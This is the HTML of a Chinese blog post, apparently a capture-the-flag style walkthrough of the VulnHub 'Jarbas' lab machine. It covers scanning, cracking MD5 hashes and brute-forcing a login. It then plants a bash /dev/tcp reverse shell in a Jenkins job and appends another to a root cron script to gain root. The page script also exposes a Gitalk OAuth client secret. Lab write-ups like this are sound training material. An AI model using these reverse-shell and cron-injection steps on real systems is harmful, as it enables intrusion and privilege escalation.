@@ -1,0 +1,328 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>vulnhub-jarbas靶机 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="vulnhub-jarbas靶机 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="打靶训练第三台
+下载地址 https://download.vulnhub.com/jarbas/Jarbas.zip
+环境配置
+下载好靶机 打开ovf文件即可
+信息探测
+arp-scan -l
+
+确定靶机IP地址
+
+确定靶机IP地址为 1..." />
+    <meta name="keywords" content="vulnhub" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              vulnhub-jarbas靶机
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-09-14
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/gd7wNOhQ5/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>打靶训练第三台</p>
+<p>下载地址 https://download.vulnhub.com/jarbas/Jarbas.zip</p>
+<h5 id="环境配置">环境配置</h5>
+<p>下载好靶机 打开ovf文件即可</p>
+<h5 id="信息探测">信息探测</h5>
+<pre><code>arp-scan -l
+</code></pre>
+<p>确定靶机IP地址</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914160149291.png" alt="image-20230914160149291" loading="lazy"></figure>
+<p>确定靶机IP地址为 192.168.56.161</p>
+<pre><code>nmap -sS -p 1-65535 -v 192.168.56.161
+</code></pre>
+<p>nmap扫描得到开放端口 和对应的服务</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914160303853.png" alt="image-20230914160303853" loading="lazy"></figure>
+<p>得到开放端口为</p>
+<pre><code>22 80 3306 8080
+</code></pre>
+<h5 id="web渗透">web渗透</h5>
+<p>首先我们访问IP</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914160610460.png" alt="image-20230914160610460" loading="lazy"></figure>
+<p>上面提示了jaebas 我以为这是建站CMS之类的。放到kali里面搜索 没有搜索出来。</p>
+<p>尝试了下目录暴破</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914160729758.png" alt="image-20230914160729758" loading="lazy"></figure>
+<p><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914160750627.png" alt="image-20230914160750627" loading="lazy">访问其中的access得到上面的内容。肉眼感觉是md5加密 放到网站解密出来类似于密码</p>
+<table>
+<thead>
+<tr>
+<th>用户名</th>
+<th>密码</th>
+<th>是否登录成功</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>tiago</td>
+<td>italia99</td>
+<td>否</td>
+</tr>
+<tr>
+<td>trindade</td>
+<td>vipsu</td>
+<td>否</td>
+</tr>
+<tr>
+<td>eder</td>
+<td>Marianna</td>
+<td>否</td>
+</tr>
+</tbody>
+</table>
+<p>直接用账号密码登录，但是他那个不是对应的。通过burp的那个暴破，成功得到账号密码进去。</p>
+<p>账号密码分别为 eder vipsu</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914182148930.png" alt="image-20230914182148930" loading="lazy"></figure>
+<p>生成一个任务 选择第一个</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914182335729.png" alt="image-20230914182335729" loading="lazy"></figure>
+<p>来到这个地方 尝试写入反弹shell</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914182435573.png" alt="image-20230914182435573" loading="lazy"></figure>
+<pre><code class="language-shell">/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.132/1234 0&gt;&amp;1
+</code></pre>
+<p>点击保存</p>
+<p>然后到kali端监听对应的端口。</p>
+<pre><code>nc -lvnp 1234
+</code></pre>
+<p>然后点击立即构建。</p>
+<p>成功反弹到shell</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914182800679.png" alt="image-20230914182800679" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914182811674.png" alt="image-20230914182811674" loading="lazy"></figure>
+<h5 id="计划任务提权">计划任务提权</h5>
+<p>查看权限</p>
+<pre><code>whoami
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914183319302.png" alt="image-20230914183319302" loading="lazy"></figure>
+<pre><code>sudo -l
+</code></pre>
+<p>显示没有任何权限</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914183340892.png" alt="image-20230914183340892" loading="lazy"></figure>
+<p>查看计划任务 发现有一个root用户执行的脚本</p>
+<pre><code>cat /etc/crontab
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914183545219.png" alt="image-20230914183545219" loading="lazy"></figure>
+<p>查看脚本</p>
+<pre><code>cat /etc/script/CleaningScript.sh
+</code></pre>
+<p>![image-20230914183719792](https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914183719792.p</p>
+<p>将反弹shell的代码写入脚本文件中 那么我们就可以得到一个root权限反弹过来的shell</p>
+<pre><code>echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.132/6666 0&gt;&amp;1&quot; &gt;&gt; /etc/script/CleaningScript.sh
+</code></pre>
+<p>同时我们需要另外起一个窗口进行监听</p>
+<pre><code>nc -lvnp 6666 
+</code></pre>
+<p>最多等5分钟就可以反弹过来了。</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914184115484.png" alt="image-20230914184115484" loading="lazy"></figure>
+<p>反弹成功 且是root权限。</p>
+<p>得到flag</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230914184201788.png" alt="image-20230914184201788" loading="lazy"></figure>
+<h5 id="总结">总结</h5>
+<pre><code>这个靶机的难度总体比较简单。可能比较坑的地方就是那个账号密码不是对应的。很多师傅尝试了对应的密码 就完了。没有想去暴破。实战中这种情况感觉确实不太多。还有就是提权用的是计划任务提权，也是一种常见的提权方式。通过存在以root权限运行的脚本文件，然后将反弹shell的命令写入脚本文件中 到了时间 脚本文件就会自己执行。
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B">信息探测</a></li>
+<li><a href="#web%E6%B8%97%E9%80%8F">web渗透</a></li>
+<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83">计划任务提权</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/vulnhub-w1r3sv101-ba-ji/">
+              <h3 class="post-title">
+                vulnhub-w1r3s.v1.0.1靶机
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
